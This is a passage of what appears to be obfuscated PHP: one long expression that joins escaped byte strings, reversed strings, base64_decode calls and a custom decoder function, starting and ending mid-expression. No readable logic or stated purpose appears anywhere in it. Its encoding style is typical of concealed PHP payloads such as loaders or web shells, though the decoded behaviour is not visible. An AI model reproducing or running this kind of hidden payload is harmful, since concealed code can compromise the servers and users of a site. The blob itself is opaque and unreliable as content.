ZKjSK')."\x65\x99\xf9\xb\x8c\xf6\xb1\x92\x2a\x91\x50\x46\x1b\x89\xf1\xe5\xd\x46\x17\xb1\x18\xea\x13\xb8\x3f\xa1\xc4\xc2\x5a\x4f\x3a\x86\x32\x3e\x4a\x1c\xf4\x92\x90\x5c\xd0\x21\x93\x91\x61\x35\x6b\xb1\x49\x88\x9\x65\x8b\x2e\x31\x1\x7f"."\x81\xe2\x2d\x1d\x56\x7c\xe6\x4e\x3e\x0\x5\x1d\x17\xef\x3d\xe4\x31\xd\x3d\xaa\x80\x75\x2\x5a\x26\x9\x3d\xa9\x6b\xdc\x32\xa0\xec\xad\x10\x1a\xb\x57\xbe\x7b\x16\x8e\xc2\x28\x6c\x2\x4c\x76\x52\x46\x21\x3e\xa\xc0\xb7\xc3\x1d"."\314\335\212\120\200\75\311\226\307\223\24\336\302\60\270\237\225\16\346\267\111\164\276\202\75\313\10\327\260\6\161\123\310\75\72\321\62\130\353\213\172\326\125\320\265\64\30\11\103\250\27\204\7\53\203\31\172"."\71\146\5\44\326\40\21\117\4\102\205\13\372\14\3\41\52\166\250\17\166\201\214\55\12\250\334\135\226\0\264\252\104\10\11\35\314\371\260\10\204\73\225\176\141\237\211\154\221\254\145\300\35\205\25\302\152".strrev('6åÀĞœã{Md)£Ô*VÌŒ¨ËÂ³í¿öhAÖªªgˆ\\h!)0Cêy&¨wD$5ö')."\x65\x89\x27\xb5\x70\xd2\x74\xb3\xd7\x24\x2a\x50\x87\x95\x2\xca\x86\x1a\xcd\x19\x58\x40\xb\xe3\x12\x42\xc\xe9\xa\xb8\x90\xef\x45\x2e\x2b\xdb\xa2\x76\x7d\x2\xc4\xff\x4c\xca\xc2\xa8\xdb\xb8\x3c\x73\xd9\xc\x3b\x3\xf7\x3e\x8e".strrev('À¤ó\\š‘Ô†#\\Èš¥ê»g»&¾«Ù¾R \\E ß'."\n".''."\0".'ÊèŒ@ÛJ‘+¤Õè¸²ÄÉøW')."\x40\xd3\xac\x5a\x9\x48\x7f\x59\x65\x40\x89\x2f\x56\x4d\xf7\xec\x99\xcd\xae\x99\x4d\x52\xcd\xe2\xee\x48\x6f\x8f\x43\x82\x66\x4a\x52\x17\x90\x26\xb5\x5a\xa9\x23\xa3\x6b\x39\xc5\xdd\xd8\xc\xad\x3f\x66\xcd\x9e\xe9\x9a\x3b\x4b\xa"."\313\51\131\127\111\56\302\75\211\346\352\10\371\205\257\206\305\204\52\307\204\255\71\26\0\50\327\105\352\271\370\102\157\20\346\42\72\227\140\246\240\247\307\304\214\110\143\202\50\127\211\133\175\210\153\245\3".strrev('èâ®Üª’Uîê.¨cQƒş7dš€Ó`ø¬ômAaF'."\r".'HÉpÒŸ"¦.RiâË!ğJãˆa±k').base64_decode('IPpBCqtQ+68WRmf8L9G66BDVDoMf7Fb4js09LejtdHJ0tkNE7pm5k3FSMeRckn+Blk9Lj9g3iDiM')."\xdf\x5e\xc0\xe1\xe\x38\xa\x40\x74\xf0\xb2\x15\x12\xf0\x7d\x1e\x41\x83\x64\xc1\x65\xca\x3f\xba\x96\x2c\x26\x68\x91\x41\x4b\xac\x90\x4c\x2d\x15\x37\xaa\x5e\x32\x85\x90\xb0\x26\xbe\xb1\x34\xa\xa4\x75\xd6\x22\x3d\x9a\x1f\x42\xd3"."\34\102\121\73\60\254\316\322\66\14\233\61\155\232\57\320\311\264\104\71\306\150\143\375\220\65\266\240\146\60\237\32\132\120\133\3\63\256\43\60\134\12\355\136\172\344\143\251\212\370\125\113\367\316\320\342\253".base64_decode('3SrZKLoJ/aC6zZ9f46qrbWvj+0g3JEJLCazO0KVmedmWSIgi68z9phsIJPpY4b/OqWB0khneVf63')."\x39\xdd\x7e\x2f\xe9\xf0\xc1\x21\x1c\x98\xf\xfa\x64\x65\xdb\x50\x5d\xed\x60\x5b\x5\x8\xcb\x17\xd4\x95\x52\xc5\x26\x83\x7e\x63\xe3\x1d\x25\xef\x79\x45\xc9\xd2\x16\xa5\xef\x88\x11\xd\xc6\x28\x51\x61\xa4\xda\x86\x4c\xfb\x90\x36"."\245\46\32\215\46\221\107\164\246\143\116\40\314\211\176\315\24\20\157\24\61\60\200\42\114\241\170\363\7\145\147\12\325\265\15\40\63\325\343\371\256\272\266\251\64\63\272\107\241\4\162\330\44\152\46\326\135"."\xc7\xbe\x3e\xda\xe9\x3\x7f\x8c\x28\xa7\x93\xe2\xd1\x15\xb\x41\x6\x5c\xd9\xe9\xeb\x8b\xf8\x23\x7e\x1f\xd1\xad\xdf\xe7\x90\x49\x87\x1e\x46\xfa\x80\xe8\xb1\x1e\x36\x89\x16\x9\x3a\x37\x3a\x5a\x5f\xf\xfe\xe6\x82\x3f\x19\xfc\x25".base64_decode('wF8SknDUAP/OAX8gZSaAzlSio7Pj4A+kNoPfZoiVAn+zORdpa+MFg9Z6nJ2g2ZUKB1naGIULFYSb').base64_decode('/vhqyjfp2QR8cEKR6RySs0xjR3jGDH4yqsN5B2cdnx410CIT4cHZWqEmHJdhWhoxEQ33fzOWOI1Z')."\xb3\x66\x38\x5d\xf5\xd\x8d\x33\x67\xcd\x6e\x6a\x9e\x43\x8e\xef\xf3\xd0\x9b\x8\x3d\x71\x71\x23\x57\x8f\x33\xe1\x8f\x9a\xa4\x3f\xfc\x2c\xc7\x7a\x98\x5d\x30\xa8\xfb\x80\x1c\xb3\xcc\x2f\x50\x1f\x10\xca\xa8\xa0\xfb\x64\x88\xda\x62".strrev(')õø®¡.J$T`Øÿal˜ßVG=ábD ®ıĞ‰JQ6ä èî9BAí9´‘„Ş'."\n".'eK€ =/XÊÃ')._kodDe('LPqrNszRJwlIrsQDVJPTMhw49rD5B5+0AHtTyzR7tHwXybWar3Xey/NvKjJQBT79sjJPPFBuq+69jw==')."\xae\xe\xf8\xf0\x56\xb8\xc0\xc\xc3\x8d\x50\x17\x51\xb8\x65\x1\x54\x79\x17\xdc\xf5\xe5\x95\x2c\xbd\x6c\x86\xf7\x8c\x21\xb6\xc6\x81\x26\x39\x56\x17\x94\xb4\xa3\x90\x4f\x3b\xd2\x6a\xca\x11\xcf\x15\x1c\xa6\x9a\x4a\xc1\x7f\x1c\x60".base64_decode('DB2FRNJhlNIOJSWPOkaUeIE6FdcbHYqecgwnE45kQnckQQF5fcSRV1IODcD1kUZHAYQNAJPBn6ET')."\x17\x16\x25\x35\xa9\x68\x60\x6f\x65\x68\xd9\x22\xd2\xfd\x1a\x9d\x0\x3e\x46\xc5\x20\xa\x59\x66\xe9\x5\x7f\xa7\xb7\xde\xb5\x2c\xc4\x52\x47\x1d\x13\x24\xd8\x8b\x59\xfe\xb5\xc5\x8c\x59\x8a\x59\x6e\x2f\x46\x4c\xf4\x52\x6f\xf0\xb".base64_decode('8ZDQOH5LTM5C7/Lkv9FcwQX/kBihQEQHGvOF0J2DoLzhoojopmqMCyOargLJWK5ckYA90dBS5gjT')."\42\23\121\303\44\105\250\33\251\10\113\41\161\243\34\323\322\12\115\217\260\327\166\342\252\31\4\373\160\231\253\161\342\321\4\160\43\126\200\266\255\102\22\4\2\354\240\72\112\355\311\27\272\360\355\65\307"."\x2f\xc0\x44\x7\x83\xeb\xf2\x88\x2d\x8d\x10\xa1\x6d\x12\x54\x9e\x20\xa0\x1c\x38\x3b\x68\x61\xf0\x60\x34\x6\xcf\x45\x85\x96\x2d\x74\xf9\xbb\xbd\x21\x17\x2a\xf\x99\x41\xf2\x6f\xc3\x2b\x59\x5d\x74\x57\x80\x3f\xca\x4\x6c\x86\x98".strrev('ß³Á`Èo¼ ²PÙpdJª0Á]Mµ¤Åš­>Z²¶5M%5—4 ã…Ğ½ó'."\n".'¸93ëğeÃ9qjÎ')."\x84\x6f\xc5\x48\x2a\x25\x35\xa1\xf4\xca\xc3\x15\x8\xa\x42\x29\xc9\xe4\x18\x6\xce\xc1\x79\xbc\x25\x7\x3c\x5c\x61\x59\xf8\xa3\x50\x88\xf9\x7a\xd9\xc9\xa0\x98\xc5\x4f\x93\xe0\x71\x38\xe8\x3a\x9a\x1b\x65\x49\x72\xb8\x50\x90\x47"."\140\241\142\121\230\265\322\2\104\106\233\0\234\221\332\223\172\0\241\101\25\245\116\161\347\101\212\351\10\364\6\373\43\76\257\253\42\22\5\12\27\30\42\125\126\110\206\247\321\140\147\216\316\43\47\310\65".base64_decode('AQpSWQOF8RNUMVN5aie0hRA1HkX0skQB4M/PnJ3LdarZCgvR16CBpKLhBR0s520zlPVhBRR/OIAa')."\12\126\51\376\322\257\370\305\212\10\3\31\325\124\332\345\154\331\247\120\226\362\124\332\73\134\63\261\122\337\361\124\12\151\127\145\143\202\121\52\103\361\55\25\26\142\22\224\23\16\71\151\32\16\271\350\220"."\163\272\103\56\351\216\270\226\37\166\44\215\24\370\63\34\140\351\205\311\251\54\100\314\312\216\54\140\140\216\234\232\124\35\71\20\120\115\307\150\316\141\314\314\221\105\70\127\0\211\205\231\16\55\245\73\364"."\141\120\244\221\201\163\143\330\61\42\227\34\43\71\331\221\233\45\73\264\164\332\121\132\223\162\214\224\34\45\55\341\60\351\21\62\25\223\142\206\250\6\271\246\250\46\206\41\330\5\377\1\343\222\53\30\261".base64_decode('Yl4dpa7Oc5pWknKlTPKb8LFDcjs+FkoA39M1Y1h2IXUsRbcvRyx9kCCsg/qKYLTlQsEBBJok2HYi').strrev('£ÀÁFWƒêuP.DJˆ¢)ÇByåºb¹^"`[ôNXô2¸ÄÔ”¯R'."\n".'¶AŸ^N{!à{').base64_decode('TLQy2j9vAQ0CebvUsA7+27hOBry1pOlx1aAvZ7GmD4nC5n+fSWSG/0MuLp+mlbz+P39VyDSmUAOj')."\xff\x3e\x3b\xcf\x3\x3a\x8a\xda\xb0\xff\xf\x1d\x5\x33\xc5\xc4\x47\xec\x8\x92\xe1\x2a\xa8\x9\xc8\xa9\x5d\xf5\x2e\x7e\xed\x82\xc4\x1a\x3a\xf7\x66\x81\x59\x5a\x72\xa4\x66\xc1\xa9\x56\x2\xd3\xac\xe4\xc8\x69\x25\x30\xa3\x55\x87"."\x9e\x2b\xc5\x1d\xb9\xe1\x12\x8\x40\x99\x39\x7\xe6\x21\x8\x2b\x40\x24\x34\x46\x52\x64\xee\xce\x4c\x37\x3a\x66\xa6\xb\xe\x19\x4c\xfc\xb8\xa\x38\x80\x5a\x4a\x39\xf2\x46\xc9\x1\x66\x3f\xf8\xff\x88\x9\x8a\x3\xbf\x39\x20\x8b"."\xe4\xa0\x84\x9e\x3\xa2\x7a\x49\x8b\x53\xb6\x3\xb5\x8d\x5d\x5a\x1e\x3e\xd9\x0\x1f\x34\x70\x8d\xc0\xa3\x3b\xc7\x44\xc2\x75\x39\x7e\x6\x9d\xbc\x95\x67\x18\xfb\x5f\xd9\x80\xc3\x3a\x61\x13\xe4\x50\x2d\x26\xd8\x60\xfc\xd7\x2c\xc2"."\126\26\116\26\112\302\265\105\173\30\141\106\56\164\221\126\140\51\21\46\70\230\374\311\321\110\146\170\143\223\210\145\65\155\270\130\20\130\1\116\305\273\154\303\65\130\337\260\256\141\310\305\247\367\67\141\342"."\142\277\11\13\61\6\1\211\367\14\106\107\351\261\257\257\42\371\222\220\101\330\103\162\276\311\371\345\72\221\137\256\43\314\156\310\42\374\332\211\203\161\135\230\0\73\201\236\205\222\337\62\256\73\250\203\75"."\243\70\257\52\354\36\210\310\105\231\61\61\2\66\54\25\141\223\357\153\260\154\154\336\302\334\55\54\72\307\26\157\313\116\270\14\214\6\5\207\313\370\271\236\310\250\364\136\12\135\220\160\301\277\230\247\133"."\3\45\51\310\373\40\103\66\251\53\171\341\361\43\320\42\260\103\203\136\144\30\10\164\242\360\304\210\240\241\245\61\11\5\115\26\34\354\352\11\264\173\220\343\207\130\167\200\276\372\335\332\332\146\210\67\144".strrev('Â¿È@‡7ƒÈ¢A@Áp[¤O1ƒ»*0FÅÎEÇvyi*’%´B#„¡Ö@s]{4¡ğN/@')."\303\135\145\305\145\203\236\27\15\14\14\70\341\171\73\264\246\111\240\227\321\333\141\242\4\31\141\256\265\152\130\113\46\262\132\61\131\305\13\164\67\270\352\245\131\365\15\122\177\236\152\227\322\355\121\120\227"."\323\71\31\76\62\351\24\336\240\354\200\101\147\7\126\104\261\47\132\336\131\246\37\307\111\140\57\1\310\112\330\61\7\112\212\56\230\104\320\247\303\311\157\157\140\51\121\165\356\10\4\311\371\101\357\142\246"."\xce\xe2\x55\xa\x54\x68\xee\x28\x7b\x93\x1a\x69\xe0\x8c\xe6\xb2\xf3\x98\x7e\x8f\x70\x2a\x3a\xdf\xdb\x52\xd0\xb5\x42\x4a\xcd\x27\x25\x80\x93\x37\x5a\xbc\xad\x55\x5e\xcf\xd2\x96\xaa\x36\x90\x24\x67\xb3\x30\x55\x72\xb7\xcd\x77\x73"."\104\62\142\301\120\40\330\351\147\156\63\202\160\10\310\361\30\126\263\166\372\310\314\40\237\262\50\303\127\201\236\256\342\312\360\125\250\116\125\22\165\242\207\314\213\160\260\201\372\153\25\355\174\211\232\51\264"."\237\23\372\1\106\231\11\16\42\20\257\17\172\107\20\310\43\303\116\301\155\166\37\30\110\114\17\273\105\323\103\320\21\160\175\202\27\355\260\127\141\307\44\240\326\21\232\64\270\153\54\351\54\127\132\61\311".base64_decode('dSyCw9ol3XDdcSZVXUEObWBmG1rFj1LlKeRZQXByWBRmsSJYSnMr7zizxgBFovs620CTaLi1ipgm')."\322\171\1\231\141\125\33\346\173\363\303\55\312\50\34\124\320\344\266\0\172\377\273\117\63\221\366\324\174\267\230\6\20\211\136\157\33\33\56\210\101\201\250\70\330\152\124\225\66\53\321\302\375\172\213\304\36"."\157\347\24\133\64\123\204\140\227\312\372\130\213\124\341\21\370\154\105\105\172\23\225\110\230\130\157\244\342\244\205\166\125\240\152\255\163\232\146\325\327\73\162\105\303\164\352\212\365\61\136\330\121\22\71\77\354"."\15\73\361\304\166\56\125\1\77\360\122\213\160\344\141\241\105\42\23\301\41\321\371\201\103\101\117\244\243\333\41\41\142\165\110\135\276\10\0\367\203\177\260\31\203\103\202\363\32\44\203\171\356\220\240\75\266"."\x43\xea\xef\xc3\xbf\x5c\x31\x1d\xf4\x1d\x26\xb\x64\x40\x84\xba\x12\xc4\x21\x45\x53\xa2\x71\x93\x28\x49\x82\x33\x16\x6a\xd9\x90\x5e\xc7\x0\x3a\xa2\xb9\x96\x1\x35\x3f\xb3\x11\xea\xa5\x63\x13\x29\xb8\x4f\x27\xc4\x0\xb8\x63\x51"."\xcf\xb7\x60\xdf\x4f\x86\x33\xa7\x26\xc0\xaa\xe\x56\x54\x27\x20\x89\x16\xa8\xca\x67\x2d\x83\x5e\x64\xfe\xff\x97\x0\x6b\x41\x95\xe3\xff\xff\x4b\x81\x3a\x12\x1e\x13\x2c\x32\xf1\xa2\xa9\x18\xff\x53\x19\x94\xc1\xb1\xae\xc2\xda\x49"."\155\144\125\150\220\32\353\353\245\300\142\210\106\122\46\11\271\150\47\23\136\200\307\207\254\322\130\57\43\51\227\350\163\277\31\70\311\324\174\201\72\275\104\214\12\14\174\150\40\304\34\337\151\326\345\40\142".strrev('“ĞÆœlq…'."\0".'ÑlòLA[¹‚¾‚Ù,¬ÄÆv0)/mp¬c¼€dÜ$ş½ChÉ©ÊIa¤Öá')."\160\35\152\123\363\360\165\140\23\361\66\14\141\10\332\110\136\241\223\36\346\207\66\204\156\4\164\163\306\14\363\141\104\226\217\70\11\155\363\343\242\25\210\102\141\326\126\101\213\261\66\72\53\264\202\274\246".base64_decode('qDB4i22WsDajTIwMbD1GsSxdy8gFFwkfv3NG0Dc4A8rjFaJFgp6gnYCflMpYchktwAGdkCdOuIh/')."\355\312\212\225\171\351\302\212\210\15\7\227\71\175\243\5\120\107\45\11\126\152\260\141\37\263\30\43\273\127\142\53\24\174\155\127\127\353\244\1\346\364\211\334\362\20\37\11\45\264\114\21\46\15\245\121\22".base64_decode('LoH5AL3DJhvsgEaKraVS8DiCxAgW2k/SLHizSGOFrJxXDBoDWUXBdqmYcak1I0OlycLZulj1GDbE')."\x24\x90\xd1\x58\x41\xc9\xe2\xc3\x12\x64\x22\x47\xe1\x63\x13\xc0\x13\x59\x1d\x7a\x97\x4b\x8a\x71\x35\x7\xaf\x18\x65\x56\x49\x1d\x88\xec\x80\x1b\xd\x53\x9c\xb4\xae\x28\x79\xb\x24\x9e\x2d\x2a\x16\x80\x9c\x2d\x64\x64\x4\xc1\x0"."\362\242\106\107\334\335\221\166\167\350\356\16\262\325\336\27\377\354\107\222\311\252\105\374\146\321\167\70\120\3\361\116\32\72\341\111\253\251\212\360\325\314\335\276\55\241\100\245\272\21\256\261\223\21\164\151\4".base64_decode('dHhZje4khJSQZrK1lVszoaRUlmp0+Xu7Yp09/mAMifiBvoinx5YAeGbE31EGbg9Qn762WsdzVo0z')."\65\217\226\371\40\167\47\4\242\262\301\174\332\22\127\221\44\17\64\15\300\301\171\363\343\272\233\232\140\306\205\15\217\221\223\263\114\241\311\115\325\325\335\106\221\210\10\304\5\115\217\237\314\35\67\331\337".strrev(')Iôğ _vBlÛD×ô…Âáo7[õ IÄ<À¤Bx‰H1{Üå¡<„	'."\n".'z4³ÑÔ°jq¨õ').strrev('	º\'Yk!8øˆ}ô¿&jø&œvlËÒ(^¥ª˜ƒè¨L-B¸¨-Áî²CÛîY-ÙP˜åÊ‡')."\xfa\x6e\x8c\x6a\x90\xf3\xb1\xf4\x38\x54\x7d\xa3\x61\xb0\xd2\x64\xf9\x39\x26\xd2\x29\x1e\x92\x3a\xe4\x7c\xb5\x29\x5\x0\xda\x3c\xa9\x17\x1a\x2b\xe5\xd3\xd2\x38\x68\x39\x76\x57\x6d\x70\xef\x22\x46\x46\xc9\x66\x63\x50\xe5\x8d\x54".base64_decode('N5HRJPsGkkYn/gYvhoCLVF8DMk9QQTKp6AMp+Afe9nNfGsTK0OUiSjzQBQNgJlYk5JmU+lZAxwYx')._kodDe('MdSt9PE9g38/v82ZbxkNX+tYAx82Glk2xT87igYOFD381rFSZTiUINXl/yH5gPTSnTKc/S6BEEcuGQ==')."\x7a\x86\x38\xa1\xbc\xc2\xd3\xea\x1b\xea\x5\x8b\xe\x7f\x87\x2f\x1c\x5b\x14\x86\xbe\x50\x7b\xfc\xd4\xff\x8e\x35\xc1\xf\xd2\x22\xa1\x9\x52\x3c\xa1\x89\x52\x2\xed\x8b\x26\x48\xe9\xa0\xfb\x7\x6b\x4a\x4f\x20\x10\x16\x5d\x3d\xd9".strrev('„¥‡'."\r".'ĞÖ3#ã‹/	‰¾Â„Oáö5~­8´Szˆ;‹ÂQÁBQ_á_gÒˆ»\\1ı’@×ª').base64_decode('jI1i4gqWCpQkdP4KaycZQFamnHwK9Ozsdte4ZtROnZITYdE6CIzWuaf0k2pM4TCAMJXB3StrqtZV').base64_decode('17rqaqINtUx9K0otyaLRIlF+Glo7az33MxkddNVFh6YK2mRrAWA9A4xk6HkYconBsIy6msGq6iFX').strrev('Ìóî)€}Óê!Id$»E‘CîY-©Ë¤8„ö[Øøˆj¿wTÁc­]Wa£Â¬kthÊàİ')."\x5c\x41\x20\x5b\xe8\x43\xa9\x69\x96\xa8\x98\x8e\x21\x74\x49\x29\xd2\xb5\xf\x5\xa9\xf1\x56\x81\x2b\xe8\x5b\x95\x69\x59\xd4\x32\x5b\xea\xa5\x76\x20\xaa\x59\xcc\xac\x2d\x3e\xfe\x84\xda\xe9\x33\x84\x82\x62\xa2\x9b\x4c\x4\x11\x1f"."\x3f\x81\x71\xe1\x45\x5a\xa1\xae\x40\x5e\x13\xbc\xc5\xc0\x82\xa8\x37\x25\x22\x8\xc8\x46\x66\x2\xf7\x42\xd8\xd3\x7\x68\x80\x50\x27\xc4\x5a\x5c\x70\xc3\x2f\x2c\xb4\xdd\x36\xb7\x5c\x64\x1b\x55\xde\x87\x38\xc\x8\x99\x4c\x2d\x84"."\7\76\205\366\65\324\1\12\327\11\37\211\223\36\200\175\34\263\175\220\331\160\147\205\355\50\327\201\101\322\4\327\302\242\121\52\42\45\344\2\274\257\111\342\223\161\320\361\344\333\54\324\37\204\316\360\40".strrev('Oa1"úxu$!,¹ôBTî-÷÷g?ò'."\0".'¾ğş*~#ïX'."\n".'r¹÷è²¾şÂÇóïäT3Ñˆ\'')."\212\67\53\140\313\305\166\53\124\141\75\241\47\146\66\306\331\64\143\176\331\250\54\117\146\12\135\363\271\357\205\121\47\323\337\247\373\35\57\167\231\102\262\241\203\127\122\5\344\100\206\144\20\117\161\304\144"."\x87\x54\xf1\xc\x87\x6d\xa8\x88\x21\x87\xed\x78\x32\xae\xe6\x65\xea\xb9\x36\x47\xbf\x9d\x63\xd6\x70\xd0\x8b\x14\xf5\xbc\x83\x2c\xd7\xa8\x64\x20\xde\x5d\x17\xd8\x5\x20\x31\x17\xd3\x41\xaa\x8e\x8c\xb8\x85\x33\xbb\xbc\x19\x52\xd2"."\x62\xb4\x47\x63\x3a\x7b\x68\x35\xaf\x50\x4\x7c\x60\x48\x30\x34\x81\x9b\x14\x4f\xc2\x2c\x8a\xf\x19\x71\x53\x71\x18\xeb\xe2\x2e\x58\x5\x33\x3d\x67\x83\xc4\x5a\x14\xc3\x25\xe3\xc8\xc\x21\x1\x6b\x8a\x57\x30\xf5\xb3\xb9\x56\x40"."\xb6\xb3\x78\xf2\x22\xab\xf1\x70\x31\xce\x1c\xe4\xd8\x6c\xf3\xa8\x7b\x58\x49\xb4\x8a\xa3\xe\x60\x61\x1\xe8\xed\x1d\xd8\x2\x43\x4c\x3\xc5\xc2\x17\xa8\x79\xcb\xc4\x2c\xe8\x9b\x65\x59\x70\x1a\x34\x5e\xe3\xac\x4c\x4c\x31\xa0\x42"."\x56\x3f\x15\xbb\x2a\xa5\x54\xf8\x14\x4a\x12\x7a\x34\x41\xf7\x71\xd4\xbf\x1d\xe9\x24\xde\x57\x26\xed\xef\x46\x27\x7d\x6c\x4d\xf4\x20\x4b\x4c\xdf\x48\xe7\x3a\x1b\x25\x81\xbc\x20\xef\x11\x28\x2\x9f\x46\xb0\x6e\xe4\xc6\x9c\x59\x8e"."\xa3\x41\x97\x10\xa\x1f\x7c\x6e\x2c\x88\x1f\x6\x62\x43\x8b\x5e\x10\x62\x31\x5d\x30\x24\x53\x92\x74\xe8\xd0\xb\x3c\x15\xd7\x12\xc\x44\x4f\xf4\xf4\x57\x4a\xc7\x9d\x5\x93\xbd\x16\x57\x9f\x36\x4\x30\xe5\xad\xe9\xe8\x8b\x62\x65"."\122\370\71\46\213\313\103\133\41\72\116\363\52\334\133\11\312\305\333\301\275\246\2\20\330\373\300\144\241\143\270\223\73\374\344\20\365\355\352\111\46\355\340\210\306\200\345\216\362\134\314\53\55\161\261\17\66"."\245\141\177\240\257\246\26\112\131\26\237\1\275\143\314\11\72\30\111\264\216\367\322\307\20\15\61\102\123\31\235\32\226\10\166\63\151\311\315\100\14\153\104\211\63\266\115\30\151\167\320\315\100\355\264\233\330".strrev('ğ”}@|93¬..„ ¸”ÅiK‡õî?p]zšœ‘¢[¤Şy…´¼"€¶ë2  8¾PÄ7›')."\xe3\x54\xad\x5\x5\x9d\xe8\x50\xc4\x69\xf1\x45\xc4\x76\x29\xa2\x4b\x4e\x58\x50\x59\xc1\x78\xd4\xc5\xe2\xe0\x89\x8a\x33\xc9\xc\x67\x6d\xb8\x54\x70\x28\xcb\x21\x7e\x5f\xc8\x3\x77\x39\x56\x5e\x81\xc0\x64\xff\x63\x2d\x67\x4c\x81".base64_decode('dwOVv12s8F2Cn+XnKUIGNV9SDZWzAdpVYyJ+WV+ipggI0DMZtyZn3cq+U2blzOMYhzxdJtjT4iER')."\237\363\23\126\10\350\313\0\54\277\134\377\255\100\75\326\220\53\167\112\33\44\52\334\136\133\336\375\43\311\140\167\50\253\224\324\161\130\310\21\362\167\165\107\46\52\256\14\133\115\362\107\375\154\225\121\223"."\124\202\144\376\300\201\334\210\312\303\232\74\226\72\101\145\5\316\73\374\136\7\172\161\215\73\230\105\101\40\143\72\340\221\27\252\200\203\137\333\307\320\305\61\231\126\252\206\214\132\211\55\47\206\371\3\61".base64_decode('JKiSqNsuNqeQgSiyOBL8IbnpMSTzDw5Po33UO4/LpCEI5taoMCN9bYxWFkft/nIzFrm5HBekSdzc').base64_decode('niFIrVI98tqAdWzQnc98+ooAbDw2gUYvrvlyBdNiHt2tGvw1ECQ68C0SlMe03FgZwGJ/30OrwVys')."\x42\xd3\x92\x7c\x4a\x13\x5b\x86\x58\x96\xf\xb0\x6\x7\xa\x61\xb3\x6b\x7\x3c\xbd\x36\x83\x88\x8\x7a\x94\x92\x62\xcd\x3e\x61\x59\x86\x9d\xd7\x33\x3e\x6d\x61\x8c\x28\x22\xd0\x11\xb2\x49\x15\xbc\xe9\xd3\x5f\xe8\xf6\x86\xc9\x9c".base64_decode('sCqCcEIsmaLkl/JAe9FgbDqIpgglQBgtS+xVuGoaqauDs3V8Qw1A2L8QCHCKpmnC8GMV9RB26OjC')."\xce\x30\xa8\x2c\x92\x56\x99\xd7\x56\xb\x1a\x21\x77\xb0\x6d\x98\xd0\x6d\xb\x59\xdf\xb0\xb\x97\x62\xde\x8f\xdf\x14\xb0\x40\x75\x41\xe4\x16\x9d\xfd\x62\x67\x35\xdc\x5d\x3b\x41\x7\x5f\xb\x62\xef\x34\x64\x42\x8a\x45\x52\xf\x41"."\xe8\x7\xa\xe5\x80\x5e\x99\x69\xb3\xbb\xdc\xa3\x10\x74\x38\xc9\xc4\x7\xee\xa0\x95\xb8\x77\x72\x89\x32\x31\x41\x90\xe6\x4b\x74\xbe\x18\xa6\x85\x8e\xa0\xc8\x1\xa4\x11\x7\xa\x20\xe2\x14\x5\xa7\xca\x50\xb\x71\x22\x14\x36\x60"."\xe8\x65\x48\x36\x76\xb0\x47\xc9\x8f\x57\x49\x31\x91\x12\xc6\xf9\xde\x43\x7c\x35\x85\x36\x1\x13\x46\xd9\x37\xd0\x2f\xdc\x58\x3b\x70\x1b\x1d\x8c\x5c\x54\xa3\x7\xa9\x1c\x1a\x61\x2c\x60\x39\xb8\xc7\x7d\x7\x3e\xaf\x47\x86\x2d\x9c"."\71\360\356\240\144\237\126\370\7\141\15\43\342\307\55\222\234\135\210\143\275\144\313\20\262\367\144\104\53\367\265\300\135\50\345\213\71\356\253\12\104\254\102\55\26\367\251\227\212\257\151\156\121\317\72\220\272"."\xac\x83\xbe\x25\xe8\xc0\x4f\xcb\x3a\x2c\x45\xa0\xa\xc5\x4c\xa1\xc1\x4c\x9a\xb2\xd\x57\xd9\xc7\xfe\x8b\xd2\x89\x3b\x5f\x24\xd0\x2\xd1\x0\x3b\xaf\xc0\x49\x2d\xe8\xb2\xa3\x32\x9a\x6a\xa1\x4b\xb0\xa3\xe4\xc7\xc8\xf8\xed\xd1\x82"."\235\121\56\317\45\33\147\316\236\53\356\41\371\60\162\237\70\344\170\237\150\376\320\343\62\106\30\222\225\316\44\372\340\251\70\263\121\242\325\53\61\171\242\126\340\202\66\376\365\137\115\7\117\45\161\23\147"."\22\116\265\130\311\102\27\124\372\312\377\177\75\160\234\212\224\320\241\53\217\131\275\252\221\175\43\117\26\204\106\121\274\5\243\341\141\363\313\314\4\362\331\61\173\223\361\3\236\377\175\245\251\224\47\133\175"."\152\241\124\276\140\102\366\101\277\114\217\172\205\145\17\5\361\232\53\214\255\160\340\241\230\1\150\142\117\106\136\330\123\200\24\13\232\260\116\202\30\133\375\371\143\140\260\142\264\46\23\154\2\350\334\345\325"."\x41\xcf\xe\x70\x4f\x1e\x88\x4c\x2d\x24\x2b\xbc\xa5\x2b\x7a\xf1\x47\x5\x45\x4\x97\x88\xe5\x45\xa3\x5d\x28\xa9\x24\xa1\x59\x74\x85\x8f\xdc\xdd\x79\xba\xd8\xc3\xc\xf0\x7a\x93\x57\x1\xc6\x38\xa3\x32\x35\x9e\x62\x6a\xd6\xb7\x61"."\x2\xf4\x2c\xf\x6c\x63\x2d\x42\x2d\x88\x73\x5b\x28\x61\xe6\x25\x6d\x40\x51\xa\x11\x66\x32\x98\x61\xaa\x20\x98\x12\x89\x8d\x8b\x40\xa8\xa1\x82\x97\x22\xb2\x51\xe6\x3d\xe5\x21\x64\x9d\x74\x88\x2f\x8\x83\x28\xa3\x3a\xb2\xa6\x90"."\xb9\x8f\x7c\x26\xe3\xcf\xa\x2b\x8\x5f\x2c\x78\xa8\x8f\x9a\xb\xc0\x88\x70\x4c\x84\x4\x49\x96\x98\x11\x65\x4c\xf8\x7e\x15\xe\x51\xb1\x8a\xd5\x2\xf1\xb9\x4a\x13\x0\x57\x2\x52\x1f\x59\xc6\x50\x90\xf2\x56\xa8\x4f\x8c\xcc\x78"."\141\36\322\173\126\136\201\32\364\65\153\41\54\216\371\354\26\26\126\221\167\37\42\246\22\62\162\130\142\44\302\45\72\244\212\55\134\53\241\70\363\306\112\137\36\243\17\222\311\314\107\14\164\256\303\266\121".strrev('ı`ç[E5Cg`‡Î'."\n".'á‰«È'."\r".'áTÿH*GÄE*ÈÎ¤ØiÈİeÆÉ‹_|³d 